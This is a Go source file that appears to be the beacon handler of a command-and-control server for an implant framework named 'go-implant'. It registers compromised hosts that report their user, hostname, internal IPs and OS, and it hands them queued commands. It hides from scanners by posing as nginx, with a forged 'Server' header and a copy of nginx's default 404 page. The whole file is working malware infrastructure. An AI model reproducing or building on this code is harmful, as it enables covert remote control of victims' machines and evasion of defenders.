package handler

import (
	"encoding/json"
	"fmt"
	"go-implant/common/communication"
	"go-implant/server/model"
	"log"
	"net/http"
	"time"

	"github.com/fatih/color"
)

// BeaconHandler handles incoming beacons
func BeaconHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodPost:

		// decode the received json
		decoder := json.NewDecoder(r.Body)
		var t communication.Beacon
		err := decoder.Decode(&t)
		if err != nil {
			printError("Error parsing JSON")
			return404(w)
			return
		}

		// check that all fields are populated
		if t.CurrentUser == "" || t.Hostname == "" || len(t.InternalIPS) == 0 || t.OS == "" || t.Sleeptime == 0 || t.UID == "" {
			printError(fmt.Sprintf("Received invalid JSON: %+v", t))
			return404(w)
			return
		}

		// The received beacon is well formatted, we respond with beaconresponse
		w.Header().Set("Content-Type", "application/json") // tell client to expect json
		w.Header().Set("Server", "nginx")                  // tell its nginx

		var myBeaconResponse communication.BeaconResponse

		// check if this UID has already registered
		if model.Exists(t.UID) {
			// exists, update record
			oldclient := model.Fetch(t.UID)
			oldclient.Lastactive = time.Now()
			myBeaconResponse = communication.BeaconResponse{Commands: oldclient.Commandqueue} // form new beaconreasponse of the commands in queue
			oldclient.Commandqueue = nil
			oldclient.Beacon = t
			model.Store(oldclient.Beacon.UID, oldclient) // store the updated client
			json.NewEncoder(w).Encode(myBeaconResponse)  // serve the request
			return
		}

		// client not yet registered
		newclient := communication.Client{Beacon: t, Commandqueue: nil, Lastactive: time.Now(), Username: "", Password: "", Forward: nil} // create new client
		model.Store(newclient.Beacon.UID, newclient)                                                                                      // store the new client
		myBeaconResponse = communication.BeaconResponse{Commands: nil}                                                                    // create Beaconresponse with empty content <- if autorun, it should be here

		// tell user we received new client
		color.Set(color.FgGreen)
		log.Printf("New client %s %s@%s (%s)", t.UID, t.CurrentUser, t.Hostname, t.OS)
		color.Unset()

		json.NewEncoder(w).Encode(myBeaconResponse) // serve the request
	default:
		// give error like 403 forbidden
		return404(w)
	}
}

// print message in red
func printError(message string) {
	color.Set(color.FgRed) // set color for the logging
	log.Printf("%s", message)
	color.Unset() // Don't forget to unset
}

// nginx default 404 page
var defaultnginx404 = `<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
`

// return the nginx default 404 to the client
func return404(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html")
	w.Header().Set("Server", "nginx")  // tell its nginx
	w.WriteHeader(http.StatusNotFound) // 404

	// write default nginx 404 page
	fmt.Fprintf(w, defaultnginx404)
}
